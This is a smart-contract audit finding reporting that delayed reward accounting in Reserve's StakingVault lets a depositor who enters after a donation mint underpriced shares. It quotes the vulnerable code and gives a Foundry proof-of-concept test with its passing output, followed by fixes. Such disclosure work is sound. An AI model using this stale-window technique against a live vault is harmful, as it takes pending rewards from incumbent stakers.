# Delayed Native Reward Accounting Lets New Depositors Capture Pending Rewards

## Metadata

- **Number:** #67
- **Severity:** Low
- **Status:** Duplicate
- **Likelihood:** Medium
- **Impact:** Medium
- **Created by:** Foundoneblock
- **Created at:** May 1, 2026 at 12:45 AM
- **Last updated:** June 2, 2026 at 5:44 AM

## Description

# Audited by [Fajar Arrizki]

Independent audit notes by Fajar Arrizki. Findings, proof-of-concept references, and impact assessments are documented for manual review.

_Note: Not all issues are guaranteed to be correct._

# Delayed Native Reward Accounting Lets New Depositors Capture Pending Rewards
---
**#M-02**
- Severity: Medium
- Validity: Tested
- Likelihood: Medium
- Impact: Bounded reward capture and dilution of incumbent stakers during stale accounting windows

## Description

`StakingVault` delays accounting of newly donated underlying/native rewards by one iteration. At the same time, ERC4626 deposit pricing depends on `totalAssets()` **before** the vault’s `_deposit()` accounting hook runs.

That creates a stale window where:

1. new underlying/native rewards are already sitting in the vault balance,
2. `totalAssets()` still excludes them,
3. and a new depositor can mint shares at a cheaper-than-fair price.

When accrual later catches up, those newly minted shares participate in value that should have belonged entirely to the pre-existing holders.

This is not a full-drain issue. It is a **bounded stale-pricing capture** that dilutes incumbent stakers and redirects part of pending rewards.

### Vulnerable accounting path

```solidity
function totalAssets() public view override returns (uint256) {
    return totalDeposited + _currentAccountedNativeRewards();
}

function _deposit(address caller, address receiver, uint256 assets, uint256 shares)
    internal
    override
    accrueRewards(caller, receiver)
{
    totalDeposited += assets;
    nativeBalanceLastKnown += assets;

    super._deposit(caller, receiver, assets, shares);
}
```

GitHub:
- `https://github.com/reserve-protocol/reserve-governor/blob/dc27a68463cec356ff18bbdd3d8edfe9b2534372/contracts/staking/StakingVault.sol#L240-L261`

The important point is that share minting depends on `previewDeposit()` / `totalAssets()`, while the newly donated underlying/native rewards are not yet reflected in that price.

### Delayed native reward recognition

```solidity
function _currentAccountedNativeRewards() internal view returns (uint256) {
    uint256 elapsed = block.timestamp - nativeRewardsLastPaid;
    uint256 rewardsBalance = nativeBalanceLastKnown - totalDeposited;

    return _calculateHandout(rewardsBalance, elapsed);
}

function _accrueRewards(address _caller, address _receiver) internal {
    ...
    totalDeposited += _currentAccountedNativeRewards();
    nativeBalanceLastKnown = IERC20(asset()).balanceOf(address(this));
    nativeRewardsLastPaid = block.timestamp;
}
```

GitHub:
- `https://github.com/reserve-protocol/reserve-governor/blob/dc27a68463cec356ff18bbdd3d8edfe9b2534372/contracts/staking/StakingVault.sol#L245-L250`
- `https://github.com/reserve-protocol/reserve-governor/blob/dc27a68463cec356ff18bbdd3d8edfe9b2534372/contracts/staking/StakingVault.sol#L401-L431`

This is why a donation can sit in the vault balance but remain excluded from share pricing until a later accrual-triggering action.

## Root Cause

The root cause is the interaction of two valid pieces of logic that become unsafe together:

1. native reward accounting is intentionally delayed,
2. ERC4626 share pricing is based on `totalAssets()` at deposit time.

Because `totalAssets()` lags behind real balance in this specific window, a new depositor can enter after value has arrived but before it is priced in.

## Impact

This issue can cause:

- discounted share minting during stale windows,
- partial capture of pending reward value by late entrants,
- dilution of incumbent holders,
- and redistribution of pending native reward value away from the intended share set.

The effect is **bounded** by the size of the pending donation and the attacker’s post-deposit share fraction. It does not directly create full vault insolvency or total principal drain.

## Likelihood

Likelihood is **medium**.

The stale window is real and deterministic once a direct donation/reward transfer lands in the vault before accounting catches up. However:

- the attacker must enter during that exact window,
- the captured amount is bounded,
- and the issue is strongest only when pending value sits idle long enough to be exploited.

So this is exploitable, but it is not an always-on drain primitive.

## Proof of Concept

### What the test proves

The test `test_M00_staleDonationWindow_allowsDiscountedShareMint()` demonstrates:

1. a donation is sent directly to the vault,
2. `vault.totalAssets()` does not yet reflect that donation,
3. a depositor entering during the stale window mints more shares than they would under fair pricing,
4. and those shares later redeem for more than the fresh deposit once accrual is processed.

### Test code

```solidity
// SPDX-License-Identifier: MIT
pragma solidity ^0.8.28;

import "forge-std/Test.sol";

import { Math } from "@openzeppelin/contracts/utils/math/Math.sol";
import { IERC20Metadata } from "@openzeppelin/contracts/token/ERC20/extensions/IERC20Metadata.sol";

import { IReserveOptimisticGovernorDeployer } from "@interfaces/IDeployer.sol";
import { IOptimisticSelectorRegistry } from "@interfaces/IOptimisticSelectorRegistry.sol";
import { IReserveOptimisticGovernor } from "@interfaces/IReserveOptimisticGovernor.sol";

import { OptimisticSelectorRegistry } from "@governance/OptimisticSelectorRegistry.sol";
import { ReserveOptimisticGovernor } from "@governance/ReserveOptimisticGovernor.sol";
import { TimelockControllerOptimistic } from "@governance/TimelockControllerOptimistic.sol";
import { ReserveOptimisticGovernorDeployer } from "@src/Deployer.sol";
import { Guardian } from "@src/Guardian.sol";
import { ReserveOptimisticGovernanceVersionRegistry } from "@src/VersionRegistry.sol";
import { StakingVault } from "@src/staking/StakingVault.sol";
import { RewardTokenRegistry } from "@staking/RewardTokenRegistry.sol";

import { MockERC20 } from "@mocks/MockERC20.sol";
import { MockRoleRegistry } from "@mocks/MockRoleRegistry.sol";

contract M00DelayedNativeRewardAccountingTest is Test {
    MockRoleRegistry private roleRegistry;
    ReserveOptimisticGovernanceVersionRegistry private versionRegistry;
    RewardTokenRegistry private rewardTokenRegistry;

    MockERC20 private token;
    MockERC20 private reward;

    StakingVault private vault;

    uint256 private constant REWARD_HALF_LIFE = 3 days;
    uint256 private constant UNSTAKING_DELAY = 1 weeks;

    address private constant ALICE = address(0xA11CE);
    address private constant BOB = address(0xB0B);

    function setUp() public {
        token = new MockERC20("Test Token", "TEST");
        reward = new MockERC20("Reward Token", "REWARD");

        roleRegistry = new MockRoleRegistry(address(this));
        versionRegistry = new ReserveOptimisticGovernanceVersionRegistry(roleRegistry);
        rewardTokenRegistry = new RewardTokenRegistry(roleRegistry);

        address vaultImpl = address(new StakingVault());
        address governorImpl = address(new ReserveOptimisticGovernor());
        address timelockImpl = address(new TimelockControllerOptimistic());
        address registryImpl = address(new OptimisticSelectorRegistry());
        Guardian guardian = new Guardian(address(this), address(0), new address[](0));

        ReserveOptimisticGovernorDeployer deployer = new ReserveOptimisticGovernorDeployer(
            address(versionRegistry),
            address(rewardTokenRegistry),
            address(guardian),
            vaultImpl,
            governorImpl,
            timelockImpl,
            registryImpl
        );

        rewardTokenRegistry.registerRewardToken(address(reward));
        versionRegistry.registerVersion(deployer);

        address[] memory rewardTokens = new address[](1);
        rewardTokens[0] = address(reward);

        IReserveOptimisticGovernorDeployer.BaseDeploymentParams memory baseParams =
            IReserveOptimisticGovernorDeployer.BaseDeploymentParams({
                optimisticParams: IReserveOptimisticGovernor.OptimisticGovernanceParams({
                    vetoDelay: 1 hours, vetoPeriod: 2 hours, vetoThreshold: 0.05e18
                }),
                standardParams: IReserveOptimisticGovernor.StandardGovernanceParams({
                    votingDelay: 1 days,
                    votingPeriod: 1 weeks,
                    voteExtension: 1 days,
                    proposalThreshold: 0.01e18,
                    quorumNumerator: 0.1e18
                }),
                selectorData: new IOptimisticSelectorRegistry.SelectorData[](0),
                optimisticProposers: new address[](0),
                additionalGuardians: new address[](0),
                timelockDelay: 2 days,
                proposalThrottleCapacity: 12
            });

        IReserveOptimisticGovernorDeployer.NewStakingVaultParams memory newStakingVaultParams =
            IReserveOptimisticGovernorDeployer.NewStakingVaultParams({
                underlying: IERC20Metadata(address(token)),
                rewardTokens: rewardTokens,
                rewardHalfLife: REWARD_HALF_LIFE,
                unstakingDelay: UNSTAKING_DELAY
            });

        (address stakingVaultAddr,,,) = deployer.deployWithNewStakingVault(baseParams, newStakingVaultParams, bytes32(0));
        vault = StakingVault(stakingVaultAddr);
    }

    function _mintAndDepositFor(address receiver, uint256 amount) internal {
        token.mint(address(this), amount);
        token.approve(address(vault), amount);
        vault.deposit(amount, receiver);
    }

    function _payoutRewards(uint256 cycles) internal {
        vm.warp(block.timestamp + REWARD_HALF_LIFE * cycles);
    }

    function test_M00_staleDonationWindow_allowsDiscountedShareMint() public {
        _mintAndDepositFor(ALICE, 1_000e18);
        _mintAndDepositFor(BOB, 2_000e18);

        uint256 totalSupplyBefore = vault.totalSupply();
        uint256 totalAssetsBefore = vault.totalAssets();
        assertEq(totalSupplyBefore, 3_000e18);
        assertEq(totalAssetsBefore, 3_000e18);

        token.mint(address(vault), 600e18);
        assertEq(vault.totalAssets(), totalAssetsBefore, "donation not yet reflected");

        uint256 depositAssets = 300e18;
        uint256 expectedFairSharesIfDonationCounted = Math.mulDiv(
            depositAssets,
            totalSupplyBefore + 1,
            (totalAssetsBefore + 600e18) + 1,
            Math.Rounding.Floor
        );

        token.mint(address(this), depositAssets);
        token.approve(address(vault), depositAssets);

        uint256 sharesBefore = vault.balanceOf(ALICE);
        vault.deposit(depositAssets, ALICE);
        uint256 mintedShares = vault.balanceOf(ALICE) - sharesBefore;

        assertGt(mintedShares, expectedFairSharesIfDonationCounted, "stale pricing mints discounted shares");

        _payoutRewards(1);
        vault.poke();

        uint256 redeemable = vault.previewRedeem(mintedShares);
        assertGt(redeemable, depositAssets, "minted shares capture part of pending donation");
    }
}

```

### Result

```text
Ran 1 test for test/M00DelayedNativeRewardAccounting.t.sol:M00DelayedNativeRewardAccountingTest
[PASS] test_M00_staleDonationWindow_allowsDiscountedShareMint() (gas: 434379)
Suite result: ok. 1 passed; 0 failed; 0 skipped
```

## Recommended Mitigation

- Ensure direct underlying/native donations are incorporated into pricing before new deposits are minted.
- Force accrual/snapshot of pending native rewards before deposit/mint paths use `totalAssets()`.
- Alternatively, segregate pending donations so post-donation entrants cannot price against stale accounting.

